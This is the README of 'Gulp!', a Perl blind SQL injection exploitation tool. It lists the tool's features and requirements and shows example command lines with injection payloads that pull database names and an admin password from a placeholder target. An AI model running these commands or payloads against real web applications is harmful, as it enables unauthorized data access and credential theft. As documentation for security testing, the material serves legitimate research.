# Gulp! A Blind SQL Injection Exploiter

This is a small script I wrote to help investigating security vulnerabilities
in web applications. Code isn't perfect (quite hacked together if you ask me)
but it's quite functional and served me good when I was too lazy to find out how
to use similar tool in the wild and wrote one myself instead. It supports various
DBMS, most notably MySQL, and can exploit Blind SQL Injection by inspecting different
server responses. For completely blind SQL Injections Gulp! also support MySQL time-based
BENCHMARK attack. You can use Gulp! to dump every data you need, provided you know what
you are doing! Oh, and it's multithread too, just don't kill your target!

## Examples

```bash
./gulp -p "http://www.target.com/target_page.php" -r database() -g "<title>(.*)Logged In(.*)</title>" -q "action=Login&injectable_parameter=<{SQLi}>"
```

This command executes multiple GET requests to the target page injecting some SQL tricky code to perform simple binary checks and recovering the data you specified with the -r parameter (the name of the database in this example) one character at a time. Successfull
requests are determined by looking at the server response and searching for a specific string (or regular expression) given by the -g parameter. You need to specify the complete query string with the needed HTTP parameters. By adding the special placeholder string *<{SQLi}>* you set the place in your requests where Gulp! will insert its magic SQL code.

You can specify every valid SQL expression with the -r parameter as in the next example.

```bash
./gulp -p "http://www.target.com/target_page.php" -r "(SELECT password FROM users where username = 'admin')" -g "<title>(.*)Logged In(.*)</title>" -q "action=Login&injectable_parameter=<{SQLi}>"
```

Sometimes (always?) you will need to tweak the injected string to successfully exploit a vulnerability. Gulp! cannot do this by itself but you can always take advantage of the features of Gulp! moving the *<{SQLi}>* placeholder to fit your needs. This can be extremely effective but it will need some knowledge of SQL and SQL Injection attacks. This is a more complex example:

```bash
./gulp -p "http://www.target.com/target_page.php" -r "(SELECT password FROM users where username = 'admin')" -g "error" -q "action=Login&injectable_parameter=1 AND 1=(SELECT 1 FROM table UNION SELECT 2 from table WHERE 1=0 WHERE 1>0 <{SQLi}>)"
```

This is a classic attack pattern trying to generate a MySQL runtime error when the subquery returns more than one record. In fact if the condition injected by Gulp! on the second part of the UNION query is TRUE MySQL will produce an error and that's is the reason we are looking into the server output for the string "error".

## Features
- Multithread
- Supports MySQL, Access, PostegreSQL, Oracle Database
- Blind SQL Injection exploitation
- Time-based SQL injection exploitation (MySQL only)
- Multiplatform (tested in Linux and Windows)
- HTTP Proxy support

## Requirements

Bein a PERL script Gulp! requires Perl (of course). I recommend PERL >= 5.8, older
versions are not supported or tested. As usual there are also some dependencies to fulfill. Here the list of packages you will need. Just grab them from CPAN!

```perl
use HTTP::Request::Common;
use LWP::UserAgent;
use POSIX;
use Options;
use CGI::Enurl;
use URI;
```


## Further help

For further help you can issue this command on your favourite shell and look at all the options Gulp! offers.

```bash
./gulp -h
```

## TODO
- automatic iteration through multiple rows
- time-based: dynamically changing the required time for TRUE and FALSE requests to balance changes in the server workload
- character range prediction ( maybe )
- config file support

## Known Issues/Behaviour
- Doesn't support HTTPS
- You can't specify empty POST parameters.
- You can't use the characters "&" or "=" in your request content ( query parameter ) if you use POST method, you must urlencode them FIRST.
- When redirecting the received Set-Cookie header is used to set a Cookie header

## Disclaimer

Software is provided as is. You can use it as you wish, just be cool. You can also submit pull requests so we can make enhance Gulp!

## Developers

Gulp! main contributor is [Stefano Angaran][sangaran].
Join this list and send your pull request!

[sangaran]: https://github.com/oniric85 "Stefano Angaran's Github"
